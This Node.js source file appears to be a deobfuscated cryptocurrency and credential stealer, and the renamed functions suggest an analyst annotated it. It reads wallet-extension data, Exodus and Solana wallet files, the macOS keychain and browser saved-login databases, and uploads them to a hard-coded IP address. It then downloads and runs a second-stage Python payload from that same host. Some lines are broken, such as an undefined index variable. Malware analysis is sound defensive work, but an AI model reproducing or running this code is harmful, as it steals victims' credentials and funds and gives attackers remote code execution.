const fs = require('fs');
const os = require('os');
const path = require("path");
const request = require("request");
const child_process = require("child_process").exec;
const hostname = os.hostname();
const platform = os.platform();
const homedir = os.homedir();
const tmp_dir = os.tmpdir();
const append_slash_if_necessary = v => v.replace(/^~([a-z]+|\/)/, (var_a, var_b) => '/' === var_b ? homedir : path.dirname(homedir) + '/' + var_b);

function check_if_dir_is_accessible(dir_path) {
  try {
    fs.accessSync(dir_path);
    return true;
  } catch (e) {
    return false;
  }
}
const path_to_brave_appdata = ["Local/BraveSoftware/Brave-Browser", "BraveSoftware/Brave-Browser", "BraveSoftware/Brave-Browser"];
const path_to_chrome_appdata = ["Local/Google/Chrome", "Google/Chrome", "google-chrome"];
const path_to_opera_appdata = ["Roaming/Opera Software/Opera Stable", "com.operasoftware.Opera", "opera"];
const wallet_extension_names = ["nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm", "fhbohimaelbohpjbbldcngcnapndodjp", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "aeachknmefphepccionboohckonoeemg", "hifafgmccdpekplomjjkcfgodnhcellj", "jblndlipeogpafnldhgmapagcccfchpi", "acmacodkjbdgmoleebolmdjonilkdbch", "dlcobpjiigpikoobohmabehhmhfoodbb", "mcohilncbfahbmgdjkbpemcciiolgcge", "agoakfejjabomempkjlepdflaleeobhb", "omaabbefbmiijedngplfjmnooppbclkk", "aholpfdialjgjfhomihkjbmgjidlcdno", "nphplpgoakhhjchkkhmiggakijnkhfnd", "penjlddjkjgpnkllboccdgccekpkcbin", "lgmpcpglpngdoalbgeoldeajfclnhafa", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "bhhhlbepdkbapadjdnnojkbgioiodbic", "gjnckgkfmgmibbkoficdidcljeaaaheg", "afbcbjpbpfadlkmhmclhkeeodmamcflc"];

const upload_wallets_to_c2 = async (base_profile_path, id_prefix, solana_short_circuit, current_time) => {
  let solana_path;
  if (!base_profile_path || '' === base_profile_path) {
    return [];
  }
  try {
    if (!check_if_dir_is_accessible(base_profile_path)) {
      return [];
    }
  } catch (e) {
    return [];
  }
  if (!id_prefix) {
    id_prefix = '';
  }
  let file_queue = [];
  for (let i = 0; i < 200; i++) {

    full_profile_path = base_profile_path + '/'
    if (i == 0) {
      full_profile_path += "Default"
    } else {
      full_profile_path += "Profile " + i
    }
    full_profile_path += "/Local Extension Settings";

    for (let j = 0; j < wallet_extension_names.length; j++) {
      let dir_path = full_profile_path + '/' + wallet_extension_names[statSync];
      if (check_if_dir_is_accessible(dir_path)) {
        let all_files_in_dir = [];
        try {
          all_files_in_dir = fs.readdirSync(dir_path);
        } catch (e) {
          all_files_in_dir = [];
        }
        all_files_in_dir.forEach(async file_name => {
          let full_file_path = path.join(dir_path, file_name);
          try {
            let file_props = fs.statSync(full_file_path);
            if (file_props.isDirectory()) {
              return;
            }
            const options = {
              filename: "103_" + id_prefix + i + '_' + wallet_extension_names[j] + '_' + file_name
            };
            file_queue.push({
              'value': fs.createReadStream(full_file_path),
              'options': options
            });
          } catch (e) {}
        });
      }
    }
  }
  if (solana_short_circuit) {
    solana_path = homedir + "/.config/solana/id.json"
    if (fs.existsSync(solana_path)) {
      try {

        const options = {
          filename: "solana_id.txt"
        };
        file_queue.push({
          'value': fs.createReadStream(solana_path),
          'options': options
        });
      } catch (e) {}
    }
  }
  upload_files_to_c2(file_queue, current_time);
  return file_queue;
};


const upload_exodus_wallet_info_to_c2 = current_time => {
  let path_to_exodus_wallet = '';
  let file_queue = [];
  if ('w' == platform[0]) {
    path_to_exodus_wallet = append_slash_if_necessary('~/') + "/AppData/Roaming/Exodus/exodus.wallet";
  } else if ('d' == platform[0]) {
    path_to_exodus_wallet = append_slash_if_necessary('~/') + "/Library/Application Support/exodus.wallet";
  } else {
    path_to_exodus_wallet = append_slash_if_necessary('~/') + "/.config/Exodus/exodus.wallet";
  }
  if (check_if_dir_is_accessible(path_to_exodus_wallet)) {
    let files_in_wallet_dir = [];
    try {
      files_in_wallet_dir = fs.readdirSync(path_to_exodus_wallet);
    } catch (e) {
      files_in_wallet_dir = [];
    }
    files_in_wallet_dir.forEach(async filename => {
      let full_path = path.join(path_to_exodus_wallet, filename);
      try {
        const options = {
          filename: "103_" + filename
        };
        file_queue.push({
          'value': fs.createReadStream(full_path),
          'options': options
        });
      } catch (e) {}
    });
  }
  upload_files_to_c2(file_queue, current_time);
  return file_queue;
};

const upload_files_to_c2 = (file_queue, current_time) => {
  const dev_state = {
    gt: function(a, b) {
      return a > b;
    }
  };
  dev_state.dev_switch = "PKaRH";
  const form_data = {
    type: '10',
    hid: "103_" + hostname,
    uts: current_time,
    multi_file: file_queue
  };
  try { // this is probably a switch for the malware dev, or to switch C2s between local and remote
    if (dev_state.dev_switch !== "PKaRH") {
      if (file_queue.length > 0) {
        const args = {
          url: unknow_url + "/uploads",
          formData: unknow_files
        };
        unknow_library.post(args, (_a, _b, _c) => {});
      }
    } else {
      if (file_queue.length > 0) {
        const args = {
          url: "http://185.153.182.241:1224/uploads",
          formData: form_data
        };
        request.post(args, (_a, _b, _c) => {});
      }
    }
  } catch (e) {}
};

const prepare_to_upload_wallets_to_c2 = async (known_path_to_browser_config, id_prefix, current_time) => {
  try {
    let path_to_browser = '';
    if (platform[0] == 'd') {
      path_to_browser = append_slash_if_necessary('~/') + "/Library/Application Support/" + known_path_to_browser_config[1]
    } else if (platform[0] == 'l') {
      path_to_browser = append_slash_if_necessary('~/') + "/.config/" + known_path_to_browser_config[2]
    } else {
      path_to_browser = append_slash_if_necessary('~/') + "/AppData/" + known_path_to_browser_config[0] + "/User Data"
    }

    upload_wallets_to_c2(path_to_browser, id_prefix + '_', 0 == id_prefix, current_time);
  } catch (e) {}
};


const upload_keychain_and_login_data_to_c2 = async current_time => {
  let file_queue = [];
  let keychain_dir = homedir + "/Library/Keychains/login.keychain";
  if (fs.existsSync(keychain_dir)) {
    try {
      const options = {
        filename: "logkc-db"
      };
      file_queue.push({
        'value': fs.createReadStream(keychain_dir),
        'options': options
      });
    } catch (e) {}
  } else {
    keychain_dir += "-db";
    if (fs.existsSync(keychain_dir)) {
      try {
        const options = {
          filename: "logkc-db"
        };
        file_queue.push({
          'value': fs.createReadStream(keychain_dir),
          'options': options
        });
      } catch (e) {}
    }
  }
  try {
    let chrome_dir = homedir + "/Library/Application Support/Google/Chrome";
    if (check_if_dir_is_accessible(chrome_dir)) {
      for (let i = 0; i < 200; i++) {
        login_data_path = chrome_dir + '/'
        if (i == 0) {
          login_data_path += "Default"
        } else {
          login_data_path += "Profile " + i
        }
        login_data_path += "/Login Data";

        try {
          if (!check_if_dir_is_accessible(login_data_path)) {
            continue;
          }
          const ld_path = chrome_dir + "/ld_" + i;
          const options = {
            filename: "pld_" + i
          };
          if (check_if_dir_is_accessible(ld_path)) {
            file_queue.push({
              'value': fs.createReadStream(ld_path),
              'options': options
            });
          } else {
            fs.copyFile(login_data_path, ld_path, _err => {
              const options = {
                filename: "pld_" + i
              };
              let small_file_queue = [{
                'value': fs.createReadStream(login_data_path),
                'options': options
              }];
              upload_files_to_c2(small_file_queue, current_time);
            });
          }
        } catch (e) {}
      }
    }
  } catch (e) {}
  try {
    let brave_path = homedir + "/Library/Application Support/BraveSoftware/Brave-Browser";
    if (check_if_dir_is_accessible(brave_path)) {
      for (let i = 0; i < 200; i++) {
        const profile_path = brave_path + '/' + (0 === i ? "Default" : "Profile " + i);
        try {
          if (!check_if_dir_is_accessible(profile_path)) {
            continue;
          }
          const brace_login_data_path = profile_path + "/Login Data";
          const options = {
            filename: "brld_" + i
          };
          if (check_if_dir_is_accessible(brace_login_data_path)) {
            file_queue.push({
              'value': fs.createReadStream(brace_login_data_path),
              'options': options
            });
          } else {
            fs.copyFile(profile_path, brace_login_data_path, _e => {
              const options = {
                filename: "brld_" + i
              };
              let file_queue = [{
                'value': fs.createReadStream(profile_path),
                'options': options
              }];
              upload_files_to_c2(file_queue, current_time);
            });
          }
        } catch (e) {}
      }
    }
  } catch (e) {}
  upload_files_to_c2(file_queue, current_time);
  return file_queue;
};


const upload_browser_local_state_to_c2 = async (browser_path, id_prefix, current_time) => {
  let file_queue = [];
  let browser_config_path = '';


  if (platform[0] == 'd') {
    browser_config_path += append_slash_if_necessary('~/') + "/Library/Application Support/" + browser_path[1]
  } else if (platform[0] == 'l') {
    browser_config_path += append_slash_if_necessary('~/') + "/.config/" + browser_path[2]
  } else {
    browser_config_path += append_slash_if_necessary('~/') + "/AppData/" + browser_path[0] + "/User Data"
  }

  let browser_local_state_path = browser_config_path + "/Local State";
  if (fs.existsSync(browser_local_state_path)) {
    try {
      const options = {
        filename: id_prefix + "_lst"
      };
      file_queue.push({
        'value': fs.createReadStream(browser_local_state_path),
        'options': options
      });
    } catch (e) {}
  }

  try {
    if (check_if_dir_is_accessible(browser_config_path)) {
      for (let i = 0; i < 200; i++) {
        const profile_path = browser_config_path + '/' + (0 === i ? "Default" : "Profile " + i);
        try {
          if (!check_if_dir_is_accessible(profile_path)) {
            continue;
          }
          const full_path = profile_path + "/Login Data";
          if (!check_if_dir_is_accessible(full_path)) {
            continue;
          }
          const options = {
            filename: id_prefix + '_' + i + "_uld"
          };
          file_queue.push({
            'value': fs.createReadStream(full_path),
            'options': options
          });
        } catch (e) {}
      }
    }
  } catch (e) {}
  upload_files_to_c2(file_queue, current_time);
  return file_queue;
};

let python_download_current_size = 0;

const untar = async tar_name => {
  child_process("tar -xf " + tar_name + " -C " + homedir, (success, _b, _c) => {
    if (success) {
      fs.rmSync(tar_name);
      return void(python_download_current_size = 0);
    }
    fs.rmSync(tar_name);
    deploy_and_run_second_stage();
  });
};

const download_python = () => {
  const p_zi_path = tmp_dir + "\\p.zi";
  const p2_zip_path = tmp_dir + "\\p2.zip";
  if (python_download_current_size >= 51476596) {
    return;
  }
  if (fs.existsSync(p_zi_path)) {
    try {
      var p_zi_props = fs.statSync(p_zi_path);
      if (p_zi_props.size >= 51476596) {
        python_download_current_size = p_zi_props.size;
        fs.rename(p_zi_path, p2_zip_path, possible_error => {
          if (possible_error) {
            throw possible_error;
          }
          untar(p2_zip_path);
        });
      } else {
        if (python_download_current_size < p_zi_props.size) {
          python_download_current_size = p_zi_props.size;
        } else {
          fs.rmSync(p_zi_path);
          python_download_current_size = 0;
        }
        setup_to_download_again();
      }
    } catch (e) {}
  } else {
    child_process("curl -Lo \"" + p_zi_path + "\" \"" + "http://185.153.182.241:1224/pdown" + "\"", (success, _b, _b) => {
      if (success) {
        python_download_current_size = 0;
        return void setup_to_download_again();
      }
      try {
        python_download_current_size = 51476596;
        fs.renameSync(p_zi_path, p2_zip_path);
        untar(p2_zip_path);
      } catch (e) {}
    });
  }
};

function setup_to_download_again() {
  setTimeout(() => {
    download_python();
  }, 20000);
}

const deploy_and_run_second_stage = async () => await new Promise((_s, _err) => {
  if ('w' == platform[0]) {
    if (fs.existsSync(homedir + "\\.pyp\\python.exe")) {
      (() => {
        const sys_info_path = homedir + "/.sysinfo";
        const command_to_run_sys_info = "\"" + homedir + "\\.pyp\\python.exe\" \"" + sys_info_path + "\"";
        try {
          fs.rmSync(sys_info_path);
        } catch (e) {}
        request.get("http://185.153.182.241:1224/client/10/103", (success, _b, data) => {
          if (!success) {
            try {
              fs.writeFileSync(sys_info_path, data);
              child_process(command_to_run_sys_info, (_a, _b, _c) => {});
            } catch (e) {}
          }
        });
      })();
    } else {
      download_python();
    }
  } else {
    (() => {
      request.get("http://185.153.182.241:1224/client/10/103", (success, _b, data) => {
        if (!success) {
          fs.writeFileSync(homedir + "/.sysinfo", data);
          child_process("python3 \"" + homedir + "/.sysinfo\"", (_a, _b, _c) => {});
        }
      });
    })();
  }
});

const main_function = async () => {
  try {
    const time_in_seconds = Math.round(new Date().getTime() / 1000);
    await (async () => {
      try {
        await prepare_to_upload_wallets_to_c2(path_to_chrome_appdata, 0, time_in_seconds);
        await prepare_to_upload_wallets_to_c2(path_to_brave_appdata, 1, time_in_seconds);
        await prepare_to_upload_wallets_to_c2(path_to_opera_appdata, 2, time_in_seconds);
        upload_exodus_wallet_info_to_c2(time_in_seconds);
        if ('w' == platform[0]) { //windows
          await upload_wallets_to_c2(append_slash_if_necessary('~/') + "/AppData/Local/Microsoft/Edge/User Data", '3_', false, time_in_seconds);
        }
        if ('d' == platform[0]) { // mac
          await upload_keychain_and_login_data_to_c2(time_in_seconds);
        } else { // linux
          await upload_browser_local_state_to_c2(path_to_chrome_appdata, 0, time_in_seconds);
          await upload_browser_local_state_to_c2(path_to_brave_appdata, 1, time_in_seconds);
          await upload_browser_local_state_to_c2(path_to_opera_appdata, 2, time_in_seconds);
        }
      } catch (e) {}
    })();
    deploy_and_run_second_stage();
  } catch (e) {}
};

main_function();